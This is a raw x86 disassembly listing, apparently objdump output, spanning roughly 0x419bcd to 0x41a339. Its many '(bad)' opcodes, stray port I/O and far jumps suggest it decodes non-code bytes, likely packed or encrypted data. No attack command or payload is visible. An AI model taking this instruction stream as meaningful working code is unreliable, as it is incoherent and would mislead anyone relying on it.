  419bcd:	rcr    DWORD PTR [ebp+0x450c0293],0xbc
  419bd4:	mov    al,0xdd
  419bd6:	jb     0x419b5f
  419bd8:	inc    edx
  419bd9:	fisub  DWORD PTR [edi]
  419bdb:	mov    bh,BYTE PTR [ebx-0x3c]
  419bde:	int3   
  419bdf:	dec    eax
  419be0:	jle    0x419b87
  419be2:	add    eax,0xda6848a3
  419be7:	mov    BYTE PTR [edi-0x51fb6fd8],dl
  419bed:	or     eax,0x96d10ef5
  419bf2:	iret   
  419bf3:	mov    al,0x5c
  419bf5:	sub    eax,DWORD PTR [edx]
  419bf7:	mul    BYTE PTR [esi]
  419bf9:	and    eax,0x7949ee0
  419bfe:	ret    
  419bff:	dec    esi
  419c00:	ins    DWORD PTR es:[edi],dx
  419c01:	lds    edx,FWORD PTR [ebp-0xd]
  419c04:	cli    
  419c05:	aaa    
  419c06:	mov    dl,0x5d
  419c08:	or     bh,BYTE PTR [eax+0xd72aae8]
  419c0e:	mov    ds:0x30b81a21,al
  419c13:	inc    eax
  419c14:	inc    ebx
  419c16:	or     eax,0x49336562
  419c1b:	pop    ecx
  419c1c:	cld    
  419c1d:	int    0xf6
  419c1f:	push   ebp
  419c20:	mov    bl,0x2a
  419c22:	retf   0xfbd6
  419c25:	adc    BYTE PTR [edi],0xc6
  419c28:	add    bl,BYTE PTR [esi-0xf]
  419c2b:	pop    es
  419c2c:	(bad)  
  419c2d:	sbb    eax,0xa3f039bb
  419c32:	ss je  0x419c81
  419c35:	push   ebp
  419c36:	adc    al,0xc5
  419c38:	lock popa 
  419c3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c3b:	rol    edx,cl
  419c3d:	mov    ds:0x2494be05,al
  419c42:	repz and dh,0x29
  419c46:	jbe    0x419be2
  419c48:	gs sti 
  419c4a:	push   esi
  419c4b:	jno    0x419c61
  419c4d:	data16 and al,0x3
  419c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c51:	xor    bh,ch
  419c53:	out    dx,eax
  419c54:	(bad)  
  419c55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c56:	pusha  
  419c57:	jg     0x419c53
  419c59:	es bnd jg 0x419c31
  419c5d:	daa    
  419c5e:	sub    al,0x94
  419c60:	push   esi
  419c61:	push   edi
  419c62:	push   cs
  419c63:	faddp  st(5),st
  419c65:	add    al,0x35
  419c67:	and    DWORD PTR [eax+0x16],0xfb5eef84
  419c6e:	inc    esp
  419c6f:	push   eax
  419c70:	rcl    DWORD PTR [edi-0x3d],1
  419c73:	or     eax,ebx
  419c75:	xchg   DWORD PTR [ebx],eax
  419c77:	stc    
  419c78:	xchg   ebx,eax
  419c79:	clc    
  419c7a:	inc    edx
  419c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c7c:	or     BYTE PTR [edx-0x24],dh
  419c7f:	push   0xffffffe1
  419c81:	lea    esi,[ecx+eax*8]
  419c84:	mov    ebx,0xe2ea99ab
  419c89:	sub    BYTE PTR [ebx+0x69],bl
  419c8c:	push   esi
  419c8d:	aas    
  419c8e:	ret    0xdc92
  419c91:	inc    ebx
  419c92:	jmp    0x419cff
  419c94:	xor    eax,ebx
  419c96:	mov    bl,0xef
  419c98:	sub    ebx,DWORD PTR [ebx+ebx*8]
  419c9b:	dec    edx
  419c9c:	ss std 
  419c9e:	sbb    al,0x71
  419ca0:	or     ebx,DWORD PTR [ecx-0x4d3e22c5]
  419ca6:	fucomp st(3)
  419ca8:	inc    ebx
  419ca9:	mov    edx,0x93c75b13
  419cae:	mov    ebx,0x369f7dde
  419cb3:	mov    edi,0x1f04ff41
  419cb8:	sti    
  419cb9:	jno    0x419c9b
  419cbb:	ins    BYTE PTR es:[edi],dx
  419cbc:	and    cl,0xf0
  419cbf:	push   eax
  419cc0:	xchg   ecx,eax
  419cc1:	call   0x690d:0xdd773c06
  419cc8:	mov    BYTE PTR [edi+0x7c],ch
  419ccb:	jnp    0x419d30
  419ccd:	cmp    esp,DWORD PTR [ebx+0x3fea552c]
  419cd3:	sub    al,0x35
  419cd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cd6:	je     0x419c98
  419cd8:	add    edx,edx
  419cda:	std    
  419cdb:	xor    cl,dh
  419cdd:	jb     0x419ca8
  419cdf:	jnp    0x419cdc
  419ce1:	repz xor al,0xdb
  419ce4:	push   ecx
  419ce5:	sub    DWORD PTR [eax+0x5e],ebx
  419ce8:	ss jnp 0x419d59
  419ceb:	mov    ds:0xd2812e50,eax
  419cf0:	cmc    
  419cf1:	mov    dh,0xab
  419cf3:	ins    BYTE PTR es:[edi],dx
  419cf4:	sbb    ebp,edi
  419cf6:	pop    edx
  419cf8:	jle    0x419d48
  419cfa:	arpl   bx,sp
  419cfc:	push   esp
  419cfd:	jp     0x419cb0
  419cff:	(bad)
  419d02:	in     al,0x6f
  419d04:	push   es
  419d05:	xchg   ebx,eax
  419d06:	shl    ebx,1
  419d08:	enter  0x1b42,0x45
  419d0c:	mov    edx,0xf9bf7793
  419d11:	mov    eax,0xea1c2e5a
  419d16:	mov    BYTE PTR [ebx+0x3f8b4077],cl
  419d1c:	out    dx,eax
  419d1d:	clc    
  419d1e:	adc    BYTE PTR [edi],ch
  419d20:	cmp    al,0xe4
  419d22:	sbb    bh,cl
  419d24:	sahf   
  419d25:	push   eax
  419d26:	jo     0x419d84
  419d28:	xchg   esp,eax
  419d29:	adc    eax,0xe90507fa
  419d2e:	ja     0x419d3f
  419d30:	xor    BYTE PTR [edx+0x62],0x39
  419d34:	dec    esi
  419d35:	mov    esp,0xe35c78d4
  419d3a:	sbb    ebp,DWORD PTR [ebx+0x6185f64d]
  419d40:	sbb    eax,esi
  419d42:	jno    0x419da1
  419d44:	or     BYTE PTR [esi],dl
  419d46:	dec    esi
  419d47:	in     al,dx
  419d48:	pop    eax
  419d49:	rol    BYTE PTR [ebp-0x31f73982],cl
  419d4f:	mov    ebx,0xc556c6ac
  419d54:	dec    ebx
  419d55:	jno    0x419d85
  419d57:	xchg   esi,eax
  419d58:	mov    ah,0x17
  419d5a:	xchg   ecx,eax
  419d5b:	dec    edx
  419d5c:	mov    bl,BYTE PTR [edi+0x8]
  419d5f:	dec    esp
  419d60:	lods   eax,DWORD PTR ds:[esi]
  419d61:	in     al,dx
  419d62:	and    BYTE PTR [edi+0x6],0x9d
  419d66:	jle    0x419d51
  419d68:	sbb    esp,DWORD PTR [ecx+0x3b7c7db]
  419d6e:	jns    0x419da5
  419d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d71:	call   0x623efca3
  419d76:	pop    edi
  419d77:	sbb    eax,0x5f4f80d4
  419d7c:	sbb    ebx,DWORD PTR [esi-0x43048d87]
  419d82:	inc    edx
  419d83:	push   eax
  419d84:	stos   BYTE PTR es:[edi],al
  419d85:	shl    BYTE PTR [ecx-0x13],cl
  419d88:	inc    edi
  419d89:	jb     0x419d92
  419d8b:	cld    
  419d8c:	ins    BYTE PTR es:[edi],dx
  419d8d:	dec    eax
  419d8e:	push   es
  419d8f:	int    0x9e
  419d91:	mov    al,0xc2
  419d93:	dec    edi
  419d94:	outs   dx,BYTE PTR ds:[esi]
  419d95:	fwait
  419d96:	jg     0x419daf
  419d98:	push   esp
  419d99:	cld    
  419d9a:	pop    esi
  419d9b:	jns    0x419dda
  419d9d:	dec    ecx
  419d9e:	test   BYTE PTR [edx-0x7f],dh
  419da1:	sbb    eax,0x136a989d
  419da6:	in     al,0xbe
  419da8:	dec    ecx
  419da9:	je     0x419e14
  419dab:	dec    esp
  419dac:	fwait
  419dad:	pop    ss
  419dae:	popf   
  419daf:	jmp    0xed9:0x1563f897
  419db6:	push   ecx
  419db7:	mov    ebp,0xf749017a
  419dbc:	es into 
  419dbe:	xchg   ebx,eax
  419dbf:	ins    BYTE PTR es:[edi],dx
  419dc0:	cdq    
  419dc1:	mov    ds:0x841224a0,eax
  419dc6:	mov    edx,0xe96a43a6
  419dcb:	push   ebp
  419dcc:	jg     0x419e09
  419dce:	dec    esp
  419dcf:	aad    0x61
  419dd1:	lds    eax,FWORD PTR ds:0x1ecd3640
  419dd7:	cli    
  419dd8:	stos   BYTE PTR es:[edi],al
  419dd9:	dec    esp
  419dda:	xlat   BYTE PTR ds:[ebx]
  419ddb:	and    bh,bh
  419ddd:	hlt    
  419dde:	jno    0x419e1d
  419de0:	ror    DWORD PTR [ebx+0x69418150],cl
  419de6:	leave  
  419de7:	sbb    al,0xc1
  419de9:	adc    eax,0xba7fce64
  419dee:	lock (bad) [eax+0x14b7a614]
  419df5:	push   ebx
  419df6:	adc    eax,0x4e990e53
  419dfc:	or     ah,BYTE PTR [ebp-0x7234169]
  419e02:	out    dx,al
  419e03:	jb     0x419de8
  419e05:	lods   al,BYTE PTR ds:[esi]
  419e06:	fldcw  WORD PTR [eax]
  419e08:	out    dx,eax
  419e09:	nop
  419e0a:	cmp    BYTE PTR [esi+eax*8+0x45],dl
  419e0e:	sub    eax,0x67b75823
  419e13:	inc    esp
  419e14:	mov    edx,0x86c0e57a
  419e19:	push   esp
  419e1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e1b:	dec    eax
  419e1c:	adc    DWORD PTR [ebx+ebp*2-0x40],ecx
  419e20:	test   al,0x9d
  419e22:	mov    eax,0x20ec24b0
  419e27:	scas   eax,DWORD PTR es:[edi]
  419e28:	push   ds
  419e29:	cmc    
  419e2a:	pop    ds
  419e2b:	push   0xffffff9f
  419e2d:	dec    ebp
  419e2e:	xlat   BYTE PTR ds:[ebx]
  419e2f:	fcom   st(3)
  419e31:	push   cs
  419e32:	add    BYTE PTR [esi-0x2a495548],cl
  419e38:	xor    eax,0x9d0b063e
  419e3d:	push   ecx
  419e3e:	scas   al,BYTE PTR es:[edi]
  419e3f:	mov    bl,0x5d
  419e41:	(bad)  
  419e42:	sub    al,0x3f
  419e44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e45:	mov    esp,0x83f479df
  419e4a:	(bad)  
  419e4b:	xor    al,0x9c
  419e4d:	test   BYTE PTR [edi+0x67],bh
  419e50:	xchg   ecx,eax
  419e51:	ror    BYTE PTR [ebp-0x56],1
  419e54:	mov    eax,ds:0x9564398c
  419e59:	imul   eax,DWORD PTR [esi+0x78f5f35],0x31
  419e60:	adc    al,0xe0
  419e62:	test   eax,0x164d2763
  419e67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e68:	push   ds
  419e69:	mov    WORD PTR [edi+0x40a6536],?
  419e6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e70:	repnz add BYTE PTR [eax+0x1d],al
  419e74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e75:	xchg   esp,eax
  419e76:	mov    eax,ds:0xe003fb47
  419e7b:	test   dl,dh
  419e7d:	das    
  419e7e:	nop
  419e7f:	jb     0x419e12
  419e81:	fidiv  WORD PTR [ecx]
  419e83:	dec    eax
  419e84:	or     bh,0x1d
  419e87:	push   edi
  419e88:	lods   al,BYTE PTR ds:[esi]
  419e89:	jp     0x419e16
  419e8b:	cmc    
  419e8c:	pop    ebx
  419e8d:	(bad)  
  419e8e:	xor    al,0x25
  419e90:	jecxz  0x419eb9
  419e92:	leave  
  419e93:	dec    ebx
  419e94:	loopne 0x419e75
  419e96:	(bad)  
  419e98:	mov    eax,ds:0xe65d6792
  419e9d:	cmp    al,0x32
  419e9f:	pop    esp
  419ea0:	mul    BYTE PTR [edx]
  419ea2:	loopne 0x419e84
  419ea4:	fninit 
  419ea6:	inc    ebp
  419ea7:	sub    ah,cl
  419ea9:	push   eax
  419eaa:	loop   0x419e67
  419eac:	repz xor BYTE PTR [eax],dl
  419eaf:	mov    ebx,DWORD PTR ds:0x60a37b57
  419eb5:	push   es
  419eb6:	cmp    eax,0x6af849df
  419ebb:	and    DWORD PTR [edx-0x3c5d352],0x990ab495
  419ec5:	loope  0x419f02
  419ec7:	(bad)  
  419ec9:	fild   QWORD PTR [eax]
  419ecb:	sbb    BYTE PTR [edx],0x9e
  419ece:	outs   dx,DWORD PTR ds:[esi]
  419ecf:	in     al,0xbe
  419ed1:	lahf   
  419ed2:	or     eax,0xdbb71c20
  419ed7:	sub    al,0x6c
  419ed9:	add    ah,BYTE PTR [ebp+0x71]
  419edc:	push   0x27
  419ede:	mov    ah,0x3
  419ee0:	jp     0x419f1d
  419ee2:	icebp  
  419ee3:	sahf   
  419ee4:	call   0xc286fee9
  419ee9:	mov    edi,0xa81c4a6d
  419eee:	(bad)  [ebx+0x6]
  419ef1:	sub    ch,BYTE PTR [esi-0x6bcc7e63]
  419ef7:	xor    DWORD PTR [eax],esi
  419ef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419efa:	shr    BYTE PTR [edi],cl
  419efc:	or     bh,BYTE PTR [ebx]
  419efe:	in     al,dx
  419eff:	jo     0x419ecf
  419f01:	adc    al,0xf6
  419f03:	add    BYTE PTR [edx+0x387f220],0x4e
  419f0a:	in     eax,dx
  419f0b:	mov    al,0x21
  419f0d:	jbe    0x419f14
  419f0f:	dec    edi
  419f10:	clc    
  419f11:	mov    dh,0x83
  419f13:	xchg   esi,eax
  419f14:	push   ecx
  419f15:	loop   0x419f37
  419f17:	dec    ecx
  419f18:	jle    0x419ebe
  419f1a:	adc    DWORD PTR [eax+0x60],0x31
  419f1e:	emms   
  419f20:	and    ch,dl
  419f22:	jge    0x419f56
  419f24:	sub    al,0x3e
  419f26:	stc    
  419f27:	xor    edx,edi
  419f29:	rcr    al,0xbe
  419f2c:	test   eax,0xb3d349e
  419f31:	pop    ds
  419f32:	pop    esi
  419f33:	lods   al,BYTE PTR ds:[esi]
  419f34:	xor    DWORD PTR [ecx],eax
  419f36:	jmp    0x419f93
  419f38:	arpl   WORD PTR [edx+eiz*4-0x43],cx
  419f3c:	inc    ebx
  419f3d:	sar    esp,0x99
  419f40:	xchg   edx,eax
  419f41:	inc    ebp
  419f42:	and    eax,0x90282fd0
  419f47:	loop   0x419f9b
  419f49:	imul   DWORD PTR [ebx-0x3faa70ce]
  419f4f:	rcr    DWORD PTR [ecx-0x50],cl
  419f52:	js     0x419f03
  419f54:	aam    0xbb
  419f56:	jo     0x419f6c
  419f58:	pop    ebx
  419f59:	ror    BYTE PTR [edi-0x23],0x4d
  419f5d:	sti    
  419f5e:	adc    al,0x40
  419f60:	lds    edx,FWORD PTR [ecx]
  419f62:	fstp   st(2)
  419f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f65:	push   0xfffffff4
  419f67:	cmp    BYTE PTR [ebp+0x39],ah
  419f6a:	fwait
  419f6b:	test   DWORD PTR [ebp+0x6da08c49],esi
  419f71:	(bad)  
  419f72:	aas    
  419f73:	xchg   edi,esp
  419f75:	hlt    
  419f76:	cwde   
  419f77:	inc    ebp
  419f78:	pop    edi
  419f79:	cdq    
  419f7a:	inc    esp
  419f7b:	sti    
  419f7c:	mov    edx,0xcbf35ba5
  419f81:	pop    esi
  419f82:	das    
  419f83:	jmp    0x12b7e799
  419f88:	pop    edx
  419f89:	sbb    ch,BYTE PTR [edx-0x3a]
  419f8c:	pop    edx
  419f8d:	in     eax,dx
  419f8e:	xchg   DWORD PTR [ebx],eax
  419f90:	(bad)  
  419f92:	sub    BYTE PTR [esi+0x4bc0b086],al
  419f98:	scas   al,BYTE PTR es:[edi]
  419f99:	(bad)  
  419f9a:	(bad)  
  419f9b:	clc    
  419f9c:	push   esp
  419f9d:	xchg   BYTE PTR [ebx],ah
  419f9f:	cld    
  419fa0:	inc    eax
  419fa1:	sub    eax,0xd2f5686
  419fa6:	jecxz  0x419f30
  419fa8:	xchg   edx,eax
  419fa9:	adc    dh,BYTE PTR [ecx-0x4226f963]
  419faf:	in     al,dx
  419fb0:	call   0x20c0c37b
  419fb5:	ins    BYTE PTR es:[edi],dx
  419fb6:	dec    edx
  419fb7:	stos   DWORD PTR es:[edi],eax
  419fb8:	aas    
  419fb9:	xor    bh,dh
  419fbb:	adc    DWORD PTR [edx],edi
  419fbd:	cmp    eax,0xcd5e7307
  419fc2:	cld    
  419fc3:	clc    
  419fc4:	je     0x41a024
  419fc6:	out    0xfc,eax
  419fc8:	mul    DWORD PTR [esi-0x77]
  419fcb:	jl     0x41a01f
  419fcd:	stos   DWORD PTR es:[edi],eax
  419fce:	mov    dh,0x49
  419fd0:	lods   eax,DWORD PTR ds:[esi]
  419fd1:	mov    esp,0x821867d0
  419fd6:	dec    eax
  419fd7:	adc    DWORD PTR [edi],esp
  419fd9:	and    ebp,0xcf741f24
  419fdf:	jl     0x419fbc
  419fe1:	push   edx
  419fe2:	jecxz  0x41a029
  419fe4:	sub    bl,ah
  419fe6:	mov    al,ds:0xa8048b4b
  419feb:	sbb    esp,esp
  419fed:	xlat   BYTE PTR ds:[ebx]
  419fee:	mov    ecx,0x441d29e3
  419ff3:	push   es
  419ff4:	or     dh,BYTE PTR [eax+eiz*4]
  419ff7:	mov    ah,0xc2
  419ff9:	push   esp
  419ffa:	pop    ebx
  419ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ffc:	pop    eax
  419ffd:	adc    dh,BYTE PTR [esi+0x2c5ee26c]
  41a003:	pop    ss
  41a004:	jne    0x419fac
  41a006:	(bad)  
  41a007:	or     BYTE PTR [esi+0x32f48db2],dh
  41a00d:	ja     0x41a020
  41a00f:	sub    ah,bl
  41a011:	nop
  41a012:	sub    edx,0xffffffe7
  41a015:	int    0x68
  41a017:	cli    
  41a018:	sub    ebx,DWORD PTR [eax+ecx*8+0x612df551]
  41a01f:	pushaw 
  41a021:	je     0x41a034
  41a023:	sbb    ebp,DWORD PTR [ebp+0x5c170000]
  41a029:	mov    dl,dh
  41a02b:	pop    esi
  41a02c:	xchg   edx,eax
  41a02d:	add    DWORD PTR [esi-0x15f0e810],ebp
  41a033:	in     al,0x77
  41a035:	xchg   ecx,eax
  41a036:	idiv   DWORD PTR [edi]
  41a038:	stos   BYTE PTR es:[edi],al
  41a039:	inc    ah
  41a03b:	jbe    0x419fe0
  41a03d:	cmp    esi,0xc114ad2e
  41a043:	lds    esp,FWORD PTR [ebp+0x7000648b]
  41a049:	in     eax,dx
  41a04a:	add    ch,BYTE PTR [edx+0x1f]
  41a04d:	loop   0x41a000
  41a04f:	add    al,0x95
  41a051:	mul    DWORD PTR [ebx+0x69]
  41a054:	ficom  DWORD PTR [ecx+0x338002d5]
  41a05a:	add    dl,dh
  41a05c:	xor    eax,0x8e0966c0
  41a061:	adc    BYTE PTR [ecx+eiz*4-0x675a3d8b],0x94
  41a069:	pop    esp
  41a06a:	daa    
  41a06b:	es popf 
  41a06d:	xor    al,0xd3
  41a06f:	mov    ch,0xac
  41a071:	cmovl  esp,DWORD PTR [edi+0x35]
  41a075:	cmp    dl,bh
  41a077:	out    0xb1,eax
  41a079:	xor    ch,BYTE PTR [esi]
  41a07b:	mov    bl,0xf1
  41a07d:	xlat   BYTE PTR ds:[ebx]
  41a07e:	div    DWORD PTR [edi+edx*8-0x53]
  41a082:	adc    eax,0x150643b
  41a087:	rcr    BYTE PTR [eax],cl
  41a089:	in     al,dx
  41a08a:	(bad)  [edi]
  41a08c:	aad    0x73
  41a08e:	mov    ch,0x5c
  41a090:	jmp    0xa5091ce
  41a095:	sahf   
  41a096:	clc    
  41a097:	mov    ecx,0x403158d
  41a09c:	mov    esi,0x51e5750f
  41a0a1:	push   ds
  41a0a2:	ret    0x29ac
  41a0a5:	lds    esi,FWORD PTR ds:0x856a1a8f
  41a0ab:	mov    ebp,0x4a513f18
  41a0b0:	les    esi,FWORD PTR [esi]
  41a0b2:	sbb    DWORD PTR [ebx+0x5961be85],edi
  41a0b8:	xor    esp,ebp
  41a0ba:	sbb    edx,ebx
  41a0bc:	int3   
  41a0bd:	adc    edi,edx
  41a0bf:	jo     0x41a0b0
  41a0c1:	or     bh,BYTE PTR [ebx+0x61db6744]
  41a0c7:	nop
  41a0c8:	out    0x78,eax
  41a0ca:	mov    cl,0x2a
  41a0cc:	stos   BYTE PTR es:[edi],al
  41a0cd:	jl     0x41a04f
  41a0cf:	mov    esp,0x666340c6
  41a0d4:	pop    ebx
  41a0d5:	xor    DWORD PTR [eax-0x42531f3d],esi
  41a0db:	loopne 0x41a0c1
  41a0dd:	pop    eax
  41a0de:	and    bl,BYTE PTR [ebp+0x5a]
  41a0e1:	push   esi
  41a0e2:	mov    gs,WORD PTR [edx+edx*8+0x11ee1d9b]
  41a0e9:	cmp    eax,ebp
  41a0eb:	(bad)  
  41a0ed:	cmp    DWORD PTR [esi],esi
  41a0ef:	or     al,0xa7
  41a0f1:	jg     0x41a08e
  41a0f3:	nop
  41a0f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0f5:	dec    ebp
  41a0f6:	mov    ds:0xd3ccb9a4,al
  41a0fb:	mov    gs,WORD PTR fs:[esi+0x2e6dc031]
  41a102:	xor    DWORD PTR [ecx+0x6d],edi
  41a105:	outs   dx,BYTE PTR ds:[esi]
  41a106:	loope  0x41a0c9
  41a108:	jo     0x41a0ea
  41a10a:	push   0x7f
  41a10c:	cwde   
  41a10d:	rcr    DWORD PTR ds:0x5dfc845a,1
  41a113:	lock mov ecx,0x4cfdc6e5
  41a119:	mov    al,0x91
  41a11b:	xchg   ebp,eax
  41a11c:	mov    esi,0xfccf70d1
  41a121:	shl    DWORD PTR [ecx-0x555600c0],cl
  41a127:	jb     0x41a147
  41a129:	aas    
  41a12a:	(bad)  
  41a12b:	xadd   al,cl
  41a12e:	pop    edi
  41a12f:	loopne 0x41a0ea
  41a131:	inc    eax
  41a132:	pop    ss
  41a133:	lds    eax,FWORD PTR [ebx+edx*8+0x401a518f]
  41a13a:	mov    bh,0x26
  41a13c:	imul   esi,DWORD PTR [edi+0x7f632121],0x1c
  41a143:	ror    DWORD PTR [edi],0x84
  41a146:	adc    DWORD PTR [eax-0x2],ebp
  41a149:	xchg   edi,eax
  41a14a:	mov    eax,0x9fb33989
  41a14f:	retf   
  41a150:	jmp    0x41a136
  41a152:	fnsave [eax]
  41a154:	dec    edi
  41a155:	loopne 0x41a1b5
  41a157:	in     eax,dx
  41a158:	fiadd  DWORD PTR [ebx]
  41a15a:	and    eax,0x71dc67ad
  41a15f:	fnstcw WORD PTR [esi]
  41a161:	ffree  st(2)
  41a163:	jbe    0x41a0f5
  41a165:	mov    ebp,0x53d58c2
  41a16a:	mov    cl,BYTE PTR [esi]
  41a16c:	xchg   ebp,eax
  41a16d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a16e:	dec    ebx
  41a16f:	pop    es
  41a170:	dec    eax
  41a171:	aaa    
  41a172:	inc    ebx
  41a173:	dec    ecx
  41a174:	pop    ebp
  41a175:	sub    DWORD PTR [edi-0x3c0ab4ff],ebx
  41a17b:	mov    ss,WORD PTR [edx]
  41a17d:	cmp    BYTE PTR [eax+0x31],ch
  41a180:	cli    
  41a181:	dec    edi
  41a182:	mov    eax,0x2933b39d
  41a187:	dec    esi
  41a188:	pop    edx
  41a189:	adc    BYTE PTR [eax],ch
  41a18b:	mov    al,ds:0xacc0855c
  41a190:	dec    edi
  41a191:	adc    eax,0x1228d354
  41a196:	mov    al,0xa2
  41a198:	jl     0x41a1e8
  41a19a:	sub    DWORD PTR [edx-0x4ca4d4ce],ebp
  41a1a0:	sub    ebp,0x63454371
  41a1a6:	data16 (bad) 
  41a1a8:	(bad)  
  41a1a9:	cld    
  41a1aa:	out    0x17,eax
  41a1ac:	sbb    bl,bh
  41a1ae:	or     edi,DWORD PTR [ebx-0x7579df61]
  41a1b4:	sub    DWORD PTR [eax+0x9],edi
  41a1b7:	test   al,0x72
  41a1b9:	mov    ds:0x7bf1eb51,al
  41a1be:	sahf   
  41a1bf:	int    0xa6
  41a1c1:	loopne 0x41a1b1
  41a1c3:	in     eax,0x78
  41a1c5:	pop    ebp
  41a1c6:	gs sub al,0xf5
  41a1c9:	inc    edi
  41a1ca:	xchg   DWORD PTR [edx],ecx
  41a1cc:	jno    0x41a16c
  41a1ce:	pop    eax
  41a1cf:	mov    al,ds:0xf14272a4
  41a1d4:	(bad)  
  41a1d6:	loopne 0x41a195
  41a1d8:	scas   al,BYTE PTR es:[edi]
  41a1d9:	jge    0x41a210
  41a1db:	xchg   BYTE PTR [ebp+edi*1+0x73],al
  41a1df:	mov    al,ds:0x53971983
  41a1e4:	jecxz  0x41a1bb
  41a1e6:	push   ds
  41a1e7:	adc    cl,BYTE PTR [ebx]
  41a1e9:	xor    BYTE PTR [ecx-0x1575e543],bl
  41a1ef:	mov    ds:0x72e771ae,eax
  41a1f4:	leave  
  41a1f5:	jb     0x41a235
  41a1f7:	sahf   
  41a1f8:	nop
  41a1f9:	pop    eax
  41a1fa:	int3   
  41a1fb:	test   al,0x92
  41a1fd:	xchg   ebx,eax
  41a1fe:	call   0xe596:0xc9c73712
  41a205:	mov    bl,0x49
  41a207:	idiv   DWORD PTR [ebp-0x5f]
  41a20a:	mov    edi,0xa9cbad35
  41a20f:	fisub  WORD PTR [edx+0x469cd7ef]
  41a215:	jmp    0x41a233
  41a217:	outs   dx,DWORD PTR ds:[esi]
  41a218:	into   
  41a219:	js     0x41a1d0
  41a21b:	jge    0x41a283
  41a21d:	jg     0x41a253
  41a21f:	dec    ebx
  41a220:	outs   dx,DWORD PTR ds:[esi]
  41a221:	mov    ebx,DWORD PTR [ebx]
  41a223:	loopne 0x41a244
  41a225:	push   eax
  41a226:	mov    dh,0xf2
  41a228:	js     0x41a285
  41a22a:	sub    BYTE PTR [ebp-0x2d09d535],al
  41a230:	sub    ebx,eax
  41a232:	aaa    
  41a233:	mov    esi,0xda43a956
  41a238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a239:	icebp  
  41a23a:	mov    cl,0x44
  41a23c:	sub    cl,BYTE PTR [edi+0x27dc420c]
  41a242:	dec    eax
  41a243:	aaa    
  41a244:	push   ds
  41a245:	xchg   ebp,eax
  41a246:	cdq    
  41a247:	cmc    
  41a248:	mov    ds:0x3f2d088a,eax
  41a24d:	inc    esp
  41a24e:	mov    BYTE PTR ds:0xc1bbff,dl
  41a254:	sub    DWORD PTR [esi+edi*1-0x6acde990],esp
  41a25b:	sub    esp,DWORD PTR [edx-0xc]
  41a25e:	adc    BYTE PTR [edx-0x6f7a1f7d],bl
  41a264:	int    0x35
  41a266:	cmc    
  41a267:	shr    BYTE PTR [eax],cl
  41a269:	dec    esi
  41a26a:	sti    
  41a26b:	in     eax,0x9b
  41a26d:	out    0xb5,eax
  41a26f:	out    0xc5,al
  41a271:	mov    ds:0x3f698a5b,al
  41a276:	shl    DWORD PTR [esi+0x6e],cl
  41a279:	stos   BYTE PTR es:[edi],al
  41a27a:	mov    ?,ebx
  41a27c:	mov    ch,0xa0
  41a27e:	out    0xd0,eax
  41a280:	mov    ch,0x90
  41a282:	and    al,bl
  41a284:	retf   
  41a285:	rcr    DWORD PTR [edi+0x14],cl
  41a288:	retf   0xacc4
  41a28b:	xlat   BYTE PTR ds:[ebx]
  41a28c:	xor    eax,0xb4980e48
  41a291:	cli    
  41a292:	repz and DWORD PTR [ebx*1-0x7a800146],esp
  41a29a:	dec    esp
  41a29b:	push   ecx
  41a29c:	mov    WORD PTR [edi+edi*1],ds
  41a29f:	pushf  
  41a2a0:	xor    DWORD PTR [edi+0x6f],0x8
  41a2a4:	test   DWORD PTR [eax+eax*2],ebp
  41a2a7:	data16 (bad) 
  41a2a9:	push   edi
  41a2aa:	iret   
  41a2ab:	sbb    eax,0xfb9a9f3e
  41a2b0:	ret    0x3fc5
  41a2b3:	jge    0x41a2df
  41a2b5:	jp     0x70fe213f
  41a2bb:	mov    eax,0x87092808
  41a2c0:	enter  0xca51,0xc4
  41a2c4:	js     0x41a2da
  41a2c6:	push   esi
  41a2c7:	jmp    0xa5be:0x212fa12a
  41a2ce:	add    DWORD PTR [ebp+edx*1+0x4d],esi
  41a2d2:	pusha  
  41a2d3:	retf   0xb833
  41a2d6:	mov    dl,0xd
  41a2d8:	or     ch,bh
  41a2da:	push   0x59
  41a2dc:	shl    BYTE PTR [ecx-0x341d2b17],cl
  41a2e2:	pop    ds
  41a2e3:	add    bh,ch
  41a2e5:	mov    ah,0x56
  41a2e7:	cmp    BYTE PTR [ecx],dh
  41a2e9:	lds    esp,FWORD PTR [eax-0x41caec6b]
  41a2ef:	je     0x41a315
  41a2f1:	popf   
  41a2f2:	fs jmp 0x41a33c
  41a2f5:	shl    DWORD PTR [edx],1
  41a2f7:	xchg   ebp,eax
  41a2f8:	push   edx
  41a2f9:	pmulhw mm2,QWORD PTR [edi]
  41a2fc:	loopne 0x41a327
  41a2fe:	ins    BYTE PTR es:[edi],dx
  41a2ff:	fadd   st,st(7)
  41a301:	sub    DWORD PTR es:[ebx+0x2479abe5],esp
  41a308:	sti    
  41a309:	into   
  41a30a:	mov    ?,WORD PTR [eax]
  41a30c:	lods   al,BYTE PTR ds:[esi]
  41a30d:	call   0x94f0:0xf90d12d
  41a314:	cmc    
  41a315:	mov    al,0xda
  41a317:	ror    DWORD PTR [ebp+0x3],0x97
  41a31b:	(bad)  
  41a31c:	mov    cl,0x81
  41a31e:	test   DWORD PTR [ebx+0x240bc632],esi
  41a324:	cmp    eax,0x7e764f32
  41a329:	repz push edi
  41a32b:	sbb    al,0xbd
  41a32d:	aaa    
  41a32e:	xchg   ebp,eax
  41a32f:	jg     0x41a38d
  41a331:	or     dl,bl
  41a333:	iret   
  41a334:	dec    ebx
  41a335:	nop
  41a336:	(bad)  
  41a337:	mov    cl,0xf3
  41a339:	cmp    ebx,ebx
